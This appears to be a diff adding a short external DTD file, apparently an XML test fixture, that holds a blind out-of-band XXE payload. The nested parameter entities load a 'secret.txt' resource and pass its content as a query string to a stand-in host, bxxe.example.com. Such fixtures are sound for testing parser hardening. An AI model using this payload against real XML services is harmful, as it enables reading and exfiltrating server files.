@@ -1,0 +1,4 @@
+<!ENTITY % lf SYSTEM "http://bxxe.example.com/secret.txt">
+<!ENTITY % ev "<!ENTITY &#x25; ex SYSTEM 'http://bxxe.example.com/ex.txt?b=%lf;'>">
+%ev;
+%ex;
